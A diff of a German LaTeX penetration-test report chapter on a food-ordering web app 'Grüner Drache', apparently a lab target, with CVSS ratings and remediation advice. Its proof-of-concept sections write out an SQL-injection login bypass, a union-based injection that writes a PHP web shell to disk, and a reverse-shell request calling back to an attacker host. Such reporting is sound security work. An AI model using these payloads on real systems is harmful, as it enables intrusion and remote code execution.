@@ -1,47 +1,57 @@
 \chapter{Grüner Drache}
+Die Webanwendung \textit{Grüner Drache} ist eine Webanwendung für einen Bestellservice. Benutzer können über ein Formular Essen und Getränke bestellen. Die Webanwendung ist unter der URL \url{http://10.0.68.105} zu finden. Ein Screenshot der Startseite mit dem Login-Formular ist in \autoref{fig:02_gruener_drache} abgebildet.
 
+\vfill
 \begin{figure}[!ht]
     \centering
     \includegraphics[width=\linewidth]{images/screenshots/04_gruener_drache.png}
     \caption{Webanwendung Grüner Drache}
     \label{fig:02_gruener_drache}
 \end{figure}
+\vfill
 \newpage
 
 \cvss{av=local, ac=low, pr=none, ui=required, s=changed, c=high, i=low, a=low}
-\cvssdescription{SQL-Injection im Anmeldeformular führt dazu, dass sich Angreifer als Administrator ohne passende Credentials einloggen können.}
+\cvssdescription{SQL-Injection im Anmeldeformular führt dazu, dass sich Angreifer als Administrator ohne gültige Credentials einloggen können.}
 
-\section{\makecvssbadge Grüner Drache: SQL Injection im Anmeldeformular}
-\cvssaddtosummary{Grüner Drache: SQL Injection im Anmeldeformular}
+\section{\makecvssbadge SQL-Injection}
+\cvssaddtosummary{Grüner Drache: SQL Injection}
 
 \subsection*{Proof of concept}
 
-Mit Hilfe einer SQL-Injection in das Anmeldeformular der Webanwendung kann sich Zugang als Administrator verschafft werden. Durch diesen Admin-Zugriff können weiter Standard-Nutzer nach der Registrierung verifiziert bzw. freigeschalten werden. 
-
-User: admin
-
-Passwort: ' OR ''='
+Mit Hilfe einer SQL-Injection im Anmeldeformular der Webanwendung kann ein Zugriff als Administrator erlangt werden. Der Angriffsvektor für diesen Angriff ist \texttt{admin} als Benutzername und \texttt{' OR ''='} als Passwort. Über diesen Admin-Zugang können nach der Registrierung weitere Standardbenutzer verifiziert bzw. freigeschaltet werden.
 
 \subsection*{Empfehlungen} 
 \begin{itemize}
-    \item Eingabevalidierung: Validieren und Escapen sie alle Nutzereingaben, um Injection Angriffe zu verhindern.
-    \item Prepared SQL-Statements: Mit Hilfe von Prepared SQL-Statements können SQL-Injection Angriffe verhindert werden, da dadurch Eingaben korrekt validiert und escaped werden.
+    \item Eingabevalidierung: Validieren und Escapen sie alle Nutzereingaben, um Injection Angriffe zu verhindern (Siehe \cite{owaspInputValidation}).
+    \item Prepared SQL-Statements: Mit Hilfe von Prepared SQL-Statements können SQL-Injection Angriffe verhindert werden, da dadurch Eingaben korrekt validiert und escaped werden (Siehe \cite{owaspSQLInjectionPrevention}).
 \end{itemize}
 
 \cvss{av=network, ac=low, pr=none, ui=required, s=changed, c=high, i=high, a=high}
 \cvssdescription{Über eine Union-Based SQL-Injection beim Abbrechen einer Bestellung kann eine Webshell auf den Webserver hochgeladen werden.}
 
-\section{\makecvssbadge Grüner Drache: Unsichere Order-Cancellation und File Upload über Union-Based SQL-Injection}
-\cvssaddtosummary{Grüner Drache: Unsichere Order-Cancellation und File Upload über Union-Based SQL-Injection}
+\section{\makecvssbadge Union-Based SQL-Injection und Remote Code Execution (RCE)}
+\cvssaddtosummary{Grüner Drache: Union-Based SQL-Injection und Remote Code Execution (RCE)}
 
 \subsection*{Proof of concept}
-Zunächst muss mit einem Nutzer eine Bestellung aufgegeben werden, welche im Folgenden durch den Admin-Zugriff bestätigt werden kann. Danach muss die Bestellung durch den Nutzer gecancelt werden, dabei wird ein unsichere PHP Skript ausgeführt. Der initiale HTTP-Post kann abgefangen werdne und die Payload dieser Nachricht so abgeändert werden, dass eine WebShell mit dem SQL Befehl hochgeladen werden kann. Die Abgeänderte Payload mit der Union-Based SQL Injection ist in der Folgenden Listing aufgeführt. 
+Zuerst muss ein Benutzer eine Bestellung aufgeben, die dann vom Admin bestätigt werden kann. Anschließend muss die Bestellung durch den Benutzer storniert werden, wobei ein unsicheres PHP-Skript ausgeführt wird. Der initiale HTTP-Post kann abgefangen und die Payload dieser Nachricht so verändert werden, dass eine WebShell mit dem SQL-Befehl hochgeladen werden kann. Die modifizierte Payload mit der Union-Based SQL Injection ist in der \autoref{listing:drache:webshell} zu finden. 
 
-Die hochgeladenen Webshell ist unter der Domain \texttt{http://10.0.68.105/shell5.php} erreichbar. Über den Post-Parameter cmd können nun Befehle auf dem Webserver ausgeführt werden. Dadurch kann eine PHP-Reverse-Shell erstellt werden, welche dem Angreifer vollen Zugriff über den Webserver ermöglicht. Dieser Reverse Shell kann zusätzlich upgegraded werden, um Steuerzeichen verwenden zu können und mit Hilfe einer Privilegien-Eskalation administrativen Zugriff über den Webserver zu erhalten.
+Die hochgeladene WebShell ist unter der Domain \texttt{http://10.0.68.105/shell5.php} erreichbar. Über den Post-Parameter \texttt{cmd} können nun Befehle auf dem Webserver ausgeführt werden. Dadurch kann eine PHP-Reverse-Shell erzeugt werden, die dem Angreifer vollen Zugriff über den Webserver ermöglicht. Für diese Reverse Shell muss zunächst ein Netcat-Listener auf dem Angreifer-System gestartet werden (Siehe \autoref{listing:netcat-listener}). Danach kann über die Webshell die Reverse Shell initiert werden, der HTTP-Request dazu befindet sich in \autoref{listing:drache:reverse-shell}.  Ein Nachweis ist in \autoref{fig:02_gruener_drache_proof} dargestellt.
 
 \begin{listing}[!ht]
 \begin{minted}{bash}
-GET /shell5.php?cmd=php+-r+'$sock%3dfsockopen("10.0.32.2",9001)%3bexec("/bin/sh+-i +<%263+>%263+2>\%263")%3b' HTTP/1.1
+POST /routers/cancel-order.php HTTP/1.1 
+Host: 10.0.68.105 
+[...]
+id=5+UNION+Select+null,null,null,+"<%3fphp+system($_REQUEST['cmd'])%3b+%3f>",+null,null, null,null,null+into+outfile+'/var/www/food-ordering-system/shell5.php'&status= Cancelled+by+Customer&payment_type=Wallet&action=
+\end{minted}
+\caption{Webshell}
+\label{listing:drache:webshell}
+\end{listing}
+
+\begin{listing}[!ht]
+\begin{minted}{bash}
+GET /shell5.php?cmd=php+-r+'$sock%3dfsockopen("<Angreifer-IP>",9001)%3bexec("/bin/sh+-i +<%263+>%263+2>\%263")%3b' HTTP/1.1
 Host: 10.0.68.105 
 [...]   
 \end{minted}
@@ -60,6 +70,6 @@ Host: 10.0.68.105
 
 \subsection*{Empfehlungen} 
 \begin{itemize}
-    \item Eingabevalidierung: Validieren und Escapen sie alle Nutzereingaben, um Injection Angriffe zu verhindern.
-    \item Prepared SQL-Statements: Mit Hilfe von Prepared SQL-Statements können SQL-Injection Angriffe verhindert werden, da dadurch Eingaben korrekt validiert und escaped werden.
+    \item Eingabevalidierung: Validieren und Escapen sie alle Nutzereingaben, um Injection Angriffe zu verhindern (Siehe \cite{owaspInputValidation}).
+    \item Prepared SQL-Statements: Mit Hilfe von Prepared SQL-Statements können SQL-Injection Angriffe verhindert werden, da dadurch Eingaben korrekt validiert und escaped werden (Siehe \cite{owaspSQLInjectionPrevention}).
 \end{itemize}
